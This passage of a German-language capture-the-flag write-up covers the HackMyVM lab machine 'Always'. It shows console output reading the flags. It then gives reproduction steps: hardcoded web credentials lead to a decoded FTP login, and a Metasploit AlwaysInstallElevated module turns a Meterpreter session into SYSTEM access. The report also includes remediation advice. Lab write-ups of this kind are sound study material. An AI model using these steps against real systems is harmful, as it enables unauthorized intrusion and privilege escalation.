+ 14.02.2025  00:02    &lt;DIR&gt;          ..
+ 03.10.2024  10:29    &lt;DIR&gt;          Administrator
+ 06.10.2024  15:22    &lt;DIR&gt;          Always
+ 30.09.2024  22:32    &lt;DIR&gt;          DefaultAppPool
+ 14.02.2025  00:02    &lt;DIR&gt;          ftpuser
+ 12.04.2011  17:08    &lt;DIR&gt;          Public
+                0 Dosya                0 bayt
+                7 Dizin   21.682.823.168 bayt bo�
+
+ C:\Users><span class="command">cd Always</span>
+
+ C:\Users\Always><span class="command">dir</span>
+  C sürücüsündeki birimin etiketi yok.
+  Birim Seri Numarası: 1470-2F5F
+
+  C:\Users\Always dizini
+
+ 06.10.2024  15:22    &lt;DIR&gt;          .
+ 06.10.2024  15:22    &lt;DIR&gt;          ..
+ 30.09.2024  21:09    &lt;DIR&gt;          Contacts
+ 06.10.2024  14:16    &lt;DIR&gt;          Desktop
+ 30.09.2024  21:09    &lt;DIR&gt;          Documents
+ 30.09.2024  21:09    &lt;DIR&gt;          Downloads
+ 30.09.2024  21:09    &lt;DIR&gt;          Favorites
+ 30.09.2024  21:09    &lt;DIR&gt;          Links
+ 30.09.2024  21:09    &lt;DIR&gt;          Music
+ 30.09.2024  21:09    &lt;DIR&gt;          Pictures
+ 30.09.2024  21:09    &lt;DIR&gt;          Saved Games
+ 30.09.2024  21:09    &lt;DIR&gt;          Searches
+ 30.09.2024  21:09    &lt;DIR&gt;          Videos
+                0 Dosya                0 bayt
+               13 Dizin   21.682.823.168 bayt bo�
+
+ C:\Users\Always><span class="command">cd Desktop</span>
+
+ C:\Users\Always\Desktop><span class="command">dir</span>
+  C sürücüsündeki birimin etiketi yok.
+  Birim Seri Numarası: 1470-2F5F
+
+  C:\Users\Always\Desktop dizini
+
+ 06.10.2024  14:16    &lt;DIR&gt;          .
+ 06.10.2024  14:16    &lt;DIR&gt;          ..
+ 06.10.2024  15:24                18 user.txt
+                1 Dosya               18 bayt
+                2 Dizin   21.682.823.168 bayt bo�
+
+ C:\Users\Always\Desktop><span class="command">type user.txt</span>
+ <span class="password">HMV{You_Found_Me!}</span>
+
+ C:\Users\Always\Desktop><span class="command">cd ..\..\Administrator\Desktop</span>
+
+ C:\Users\Administrator\Desktop><span class="command">dir</span>
+  C sürücüsündeki birimin etiketi yok.
+  Birim Seri Numarası: 1470-2F5F
+
+  C:\Users\Administrator\Desktop dizini
+
+ 03.10.2024  10:37    &lt;DIR&gt;          .
+ 03.10.2024  10:37    &lt;DIR&gt;          ..
+ 06.10.2024  15:25                22 root.txt
+                1 Dosya               22 bayt
+                2 Dizin   21.682.823.168 bayt bo�
+
+ C:\Users\Administrator\Desktop><span class="command">type root.txt</span>
+ <span class="password">HMV{White_Flag_Raised}</span>
+
+ C:\Users\Administrator\Desktop>
+                    </pre> <!-- Maskierung: < > -->
+                </div>
+             </div>
+        </section>
+
+        <!-- Proof of Concept Abschnitte -->
+        <section id="poc-initial-access">
+            <h2>Proof of Concept (Initial Access via Hardcoded Credentials)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser POC beschreibt, wie der initiale Zugriff durch Ausnutzung der im Client-seitigen JavaScript hardcodierten Admin-Credentials und anschließender Entdeckung der FTP-Credentials erlangt wurde.
+            </p>
+            <p>
+                <strong>Schwachstelle:</strong> Hardcodierte Administrator-Anmeldedaten in JavaScript auf der Admin-Login-Seite (`http://always.hmv:8080/admin/`). Speicherung von FTP-Credentials (Base64-kodiert) auf einer nachfolgenden Admin-Seite (`admin_notes.html`).
+            </p>
+            <p>
+                <strong>Schritte zur Reproduktion:</strong>
+                <ol>
+                    <li>Navigiere zu `http://always.hmv:8080/admin/`.</li>
+                    <li>Untersuche den Quellcode der Seite (insbesondere das JavaScript `validateForm()`). Finde die Credentials: `admin` / `adminpass123`.</li>
+                    <li>Melde dich mit diesen Credentials auf der Seite an.</li>
+                    <li>Du wirst zu `admin_notes.html` weitergeleitet. Kopiere den Base64-String `ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=`.</li>
+                    <li>Dekodiere den Base64-String (z.B. `echo 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' | base64 -d`). Das Ergebnis sind die FTP-Credentials: `ftpuser` / `KeepGoingBro!!!`.</li>
+                    <li>Melde dich mit diesen Credentials am FTP-Server an: `ftp ftpuser@192.168.2.176`.</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Erwartetes Ergebnis:</strong> Erfolgreicher Login auf der Admin-Webseite und anschließender erfolgreicher Login am FTP-Server als `ftpuser`.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie hardcodierte Credentials aus dem Client-Code. Implementieren Sie serverseitige Authentifizierung. Speichern Sie keine Credentials auf Webseiten, auch nicht kodiert. Ändern Sie betroffene Passwörter (`admin`, `ftpuser`).
+            </p>
+        </section>
+
+        <section id="poc-privesc">
+            <h2>Proof of Concept (Privilege Escalation via AlwaysInstallElevated)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Dieser POC beschreibt die Ausnutzung der `AlwaysInstallElevated`-Fehlkonfiguration mittels Metasploit, um von der `ftpuser`-Meterpreter-Session zu SYSTEM-Rechten zu gelangen.
+            </p>
+             <p>
+                <strong>Schwachstelle:</strong> Die Windows-Gruppenrichtlinien `AlwaysInstallElevated` sind aktiviert, was es jedem Benutzer erlaubt, MSI-Pakete mit SYSTEM-Rechten zu installieren.
+            </p>
+            <p>
+                <strong>Voraussetzungen:</strong> Eine bestehende Meterpreter-Session als Low-Privilege-Benutzer (hier `ftpuser`, Session 1). Metasploit Framework.
+            </p>
+            <p>
+                <strong>Schritte zur Reproduktion (innerhalb von Metasploit):</strong>
+                <ol>
+                    <li>Identifiziere die anfällige Session: `sessions -l` (angenommen, es ist Session 1).</li>
+                    <li>Lade das Exploit-Modul: `use exploit/windows/local/always_install_elevated`.</li>
+                    <li>Setze die Ziel-Session: `set SESSION 1`.</li>
+                    <li>(Optional: Konfiguriere Payload, LHOST, LPORT für die neue SYSTEM-Shell, falls von den Standardeinstellungen abweichend gewünscht).</li>
+                    <li>Führe den Exploit aus: `run` oder `exploit`.</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Erwartetes Ergebnis:</strong> Das Modul lädt eine bösartige MSI-Datei hoch, führt sie aus und eine neue Meterpreter-Session (z.B. Session 2) wird mit `NT AUTHORITY\SYSTEM`-Rechten geöffnet. Dies kann mit `getuid` in der neuen Session überprüft werden.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie **dringend** die Gruppenrichtlinien `AlwaysInstallElevated` für Benutzer- und Computerkonfigurationen (`reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f` und `reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f`). Überwachen Sie die Systemintegrität und MSI-Installationen.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\Always\Desktop\user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{You_Found_Me!}</span></div>
+                </div>
+
+                <!-- Root Flag -->
+                <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\Administrator\Desktop\root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{White_Flag_Raised}</span></div>
+                </div>
+            </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2025-02-13</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html> 
